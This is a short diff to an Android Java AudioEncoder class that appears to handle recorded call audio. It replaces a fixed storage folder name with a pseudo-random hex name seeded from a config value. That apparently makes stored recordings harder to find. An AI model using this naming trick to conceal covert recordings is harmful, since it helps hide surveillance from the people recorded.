@@ -9,6 +9,7 @@ import java.io.InputStream;
 import java.io.OutputStream;
 import java.nio.ByteBuffer;
 import java.nio.ByteOrder;
+import java.util.Random;
 
 import android.media.AmrInputStream;
 
@@ -22,7 +23,7 @@ import com.musicg.wave.WaveHeader;
 
 public class AudioEncoder {
 	private static final String TAG = "AudioEncoding";
-	private static String audioDirectory = "k0/";
+	private static String audioDirectory;
 	private static String audioStorage;
 	private boolean call_finished;
 	private int last_epoch = 0, first_epoch = 0, data_size = 0;
@@ -294,6 +295,7 @@ public class AudioEncoder {
 	
 	static public boolean createAudioStorage() {
 		// Create storage directory
+		audioDirectory = getAudioDirectoryName();
 		audioStorage = Status.getAppContext().getFilesDir().getAbsolutePath() + "/" + audioDirectory;
 	
 		if (Path.createDirectory(audioStorage) == false) {
@@ -319,5 +321,15 @@ public class AudioEncoder {
 		}
 		
 		return audioStorage;
+	}
+	
+	static private String getAudioDirectoryName() {
+		long seed = Long.parseLong(Cfg.RANDOM.substring(0, 6), 16);
+		byte[] name = new byte[3];
+		Random rand = new Random(seed / 6);
+		
+		rand.nextBytes(name);
+		
+		return StringUtils.byteArrayToHexString(name);
 	}
 }
